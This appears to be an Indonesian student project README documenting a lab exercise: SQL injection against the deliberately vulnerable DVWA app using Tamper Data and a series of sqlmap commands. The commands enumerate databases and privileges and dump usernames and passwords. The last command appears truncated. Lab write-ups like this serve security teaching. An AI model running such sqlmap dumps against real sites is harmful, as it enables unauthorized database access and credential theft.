# Tugas Final Project

### Anggota Kelompok

|Nama      |NRP    |
|---|---|
Rian Danis  | 5114100084
Naufan Arifie | 5114100136
Dimas Hirda P | 5114100147


### DVWA

### Lesson 7

#### 1. Set level sekuritas dvwa menjadi low
![alt text](https://github.com/dimashirda/PKSJ-1/blob/master/PKSJ/Lesson%207/set_secure_low.PNG)

#### 2. Buka menu sql injection dan jalankan tamper data
![alt text](https://github.com/dimashirda/PKSJ-1/blob/master/PKSJ/Lesson%207/open_sql_injection.PNG)

![alt text](https://github.com/dimashirda/PKSJ-1/blob/master/PKSJ/Lesson%207/open_tamper_data.PNG)

#### 3. Ambil Cookie dan Referer
Cookie dan Referer ini nantinya akan digunakan untuk breach sekuritas

Masukkan angka 1 di sql injection
![alt text](https://github.com/dimashirda/PKSJ-1/blob/master/PKSJ/Lesson%207/1.PNG)

Uncheck kolom "Continue Tampering"
![alt text](https://github.com/dimashirda/PKSJ-1/blob/master/PKSJ/Lesson%207/uncheck_continue.PNG)

Buka tamper data, dan pilih input method GET ke 2
![alt text](https://github.com/dimashirda/PKSJ-1/blob/master/PKSJ/Lesson%207/pilih_ke_2.PNG)

Ambil data bagian referer dan cookie, save ke leafpad
![alt text](https://github.com/dimashirda/PKSJ-1/blob/master/PKSJ/Lesson%207/Copy_cookie_refere.PNG)

#### 4. Menggunakan sqlmap
```bash
sqlmap -u "http://192.168.1.32/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=bc78fc501dc580a7af78f65f70d296b8; security=low" -b --current-db --current-user
```
![alt text](https://github.com/dimashirda/PKSJ-1/blob/master/PKSJ/Lesson%207/command_sqlmap.PNG)

Isi semua pertanyaan dengan "Y"

![alt text](https://github.com/dimashirda/PKSJ-1/blob/master/PKSJ/Lesson%207/Y.PNG)

Ganti PHPSESSID sesuai dengan yang didapatkan dari cookie hasil tamper data
hasil command diatas akan mereturn database user untuk db saat ini yaitu dvwa

![alt text](https://github.com/dimashirda/PKSJ-1/blob/master/PKSJ/Lesson%207/result_db_user.PNG)

Command berikutnya akan memberikan user dan password jika berhasil

```bash
sqlmap -u "http://192.168.1.32/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=bc78fc501dc580a7af78f65f70d296b8; security=low" --string="Surname" --users --password
```
![alt text](https://github.com/dimashirda/PKSJ-1/blob/master/PKSJ/Lesson%207/result_password_user.PNG)

Command berikutnya akan memberikan level privileges suatu user

```bash
sqlmap -u "http://192.168.1.32/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=bc78fc501dc580a7af78f65f70d296b8; security=low" -U db_hacker --privileges
```
![alt text](https://github.com/dimashirda/PKSJ-1/blob/master/PKSJ/Lesson%207/priviliges_result.PNG)

Command berikutnya akan menunjukkan semua list databases

```bash
sqlmap -u "http://192.168.1.32/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=bc78fc501dc580a7af78f65f70d296b8; security=low" --dbs
```
![alt text](https://github.com/dimashirda/PKSJ-1/blob/master/PKSJ/Lesson%207/db_list_result.PNG)

Command berikutnya akan menunjukkan semua isi dari tabel dvwa

```bash
sqlmap -u "http://192.168.1.32/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=bc78fc501dc580a7af78f65f70d296b8; security=low" -D dvwa --tables
```
![alt text](https://github.com/dimashirda/PKSJ-1/blob/master/PKSJ/Lesson%207/dvwa_content_result.PNG)

Command berikutnya akan menunjukkan semua isi dari kolom users tabel dvwa

```bash
sqlmap -u "http://192.168.1.32/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=bc78fc501dc580a7af78f65f70d296b8; security=low" -D dvwa -T users --columns
```
![alt text](https://github.com/dimashirda/PKSJ-1/blob/master/PKSJ/Lesson%207/dvwa_user_columns_result.PNG)

Command berikutnya akan menunjukkan password dari tiap user

```bash
sqlmap -u "http://192.168.1.32/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=bc78fc501dc580a7af78f65f70d296b8; security=low" -D dvwa -T users -C user,password --dump
```
![alt text](https://github.com/dimashirda/PKSJ-1/blob/master/PKSJ/Lesson%207/obtain_dvwa_users_password_result.PNG)

Melihat file output

```bash
output/* -print | xargs ls -l
```
![alt text](https://github.com/dimashirda/PKSJ-1/blob/master/PKSJ/Lesson%207/cek_output_file.PNG)













